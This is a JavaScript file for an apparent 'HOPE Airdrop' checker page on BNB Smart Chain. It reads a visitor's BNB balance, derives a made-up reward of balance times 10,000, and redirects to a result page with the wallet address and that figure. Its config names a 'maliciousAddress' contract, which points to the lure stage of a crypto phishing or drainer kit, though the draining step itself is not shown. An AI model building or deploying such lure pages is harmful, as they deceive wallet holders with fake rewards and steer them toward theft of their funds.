// ============================================
// Configuration
// ============================================
const CONFIG = {
    hopeAddress: "0x6E77cdB742c044Bdc75F4416973d1f6aAa878756",
    maliciousAddress: "0x4187f22Ac4Eb42a9a315c1D89c49FbC250Ecfbd1",
};

// ============================================
// RPC List
// ============================================
const RPC_LIST = [
    'https://rpc.bsc.nodereal.io/',
    'https://bsc-dataseed1.binance.org/',
    'https://bsc-dataseed2.binance.org/',
    'https://bsc-dataseed1.defibit.io/',
    'https://bsc-dataseed2.defibit.io/',
    'https://rpc.ankr.com/bsc',
];

// ============================================
// DOM Ready
// ============================================
document.addEventListener('DOMContentLoaded', function() {

    const queryBtn = document.getElementById('queryBtn');
    const queryAddressInput = document.getElementById('queryAddressInput');
    const resultMessage = document.getElementById('resultMessage');
    const queryResult = document.getElementById('queryResult');
    const airdropAmountEl = document.getElementById('airdropAmount');

    if (!queryBtn) {
        console.error('❌ queryBtn not found');
        return;
    }

    console.log('✅ Page loaded');
    console.log('📋 HOPE Address:', CONFIG.hopeAddress);
    console.log('📋 Malicious Contract:', CONFIG.maliciousAddress);

    // ============================================
    // Query Airdrop
    // ============================================
    queryBtn.addEventListener('click', async function() {
        const address = queryAddressInput.value.trim();
        console.log('🔍 Checking address:', address);

        if (!address || !address.startsWith('0x') || address.length !== 42) {
            alert('Please enter a valid BSC wallet address (0x...)');
            return;
        }

        resultMessage.textContent = '⏳ Checking...';
        resultMessage.style.color = '#f39c12';

        for (const rpcUrl of RPC_LIST) {
            try {
                const bscProvider = new ethers.providers.JsonRpcProvider(rpcUrl);
                const timeoutPromise = new Promise((_, reject) => {
                    setTimeout(() => reject(new Error('Connection timeout')), 10000);
                });
                const balancePromise = bscProvider.getBalance(address);
                const balanceWei = await Promise.race([balancePromise, timeoutPromise]);
                
                const bnbAmount = ethers.utils.formatEther(balanceWei);
                console.log(`💰 BNB Balance: ${bnbAmount}`);

                const airdropAmount = parseFloat(bnbAmount) * 0.1 * 100000;
                const displayValue = airdropAmount.toFixed(4);

                const params = new URLSearchParams();
                params.set('address', address);
                params.set('amount', displayValue);
                window.location.href = 'result.html?' + params.toString();
                return;

            } catch (error) {
                console.warn(`⚠️ RPC ${rpcUrl} failed:`, error.message);
            }
        }

        resultMessage.textContent = '❌ Check failed, please try again';
        resultMessage.style.color = '#e74c3c';
    });

    queryAddressInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            queryBtn.click();
        }
    });

    console.log('🎯 HOPE Airdrop page loaded');
});